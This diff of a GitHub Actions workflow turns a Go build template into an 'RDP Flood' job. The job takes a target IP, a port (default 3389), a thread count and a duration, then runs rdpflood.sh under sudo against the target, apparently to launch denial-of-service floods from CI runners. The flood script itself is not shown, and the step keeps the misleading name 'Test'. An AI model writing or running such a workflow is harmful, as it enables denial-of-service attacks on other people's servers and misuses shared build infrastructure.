@@ -1,7 +1,7 @@
 # This workflow will build a golang project
 # For more information see: https://docs.github.com/en/actions/automating-builds-and-tests/building-and-testing-go
 
-name: Go
+name: RDP Flood
 
 on:
   workflow_dispatch:
@@ -9,6 +9,10 @@ on:
       iptgt:
         description: "IP Target"
         required: true
+      ptgt:
+        description: "Port Target"
+        required: true
+        default: "3389"
       thread:
         description: "Threads"
         required: true
@@ -36,4 +40,5 @@ jobs:
     - name: Test
       run: |
         chmod +x rdpflood.sh
-        sudo ./rdpflood.sh ${{ github.event.inputs.iptgt }} ${{ github.event.inputs.thread }} ${{ github.event.inputs.duration }}
+        sudo ./rdpflood.sh ${{ github.event.inputs.iptgt }} ${{ github.event.inputs.ptgt }} ${{ github.event.inputs.thread }} ${{ github.event.inputs.duration }}
+
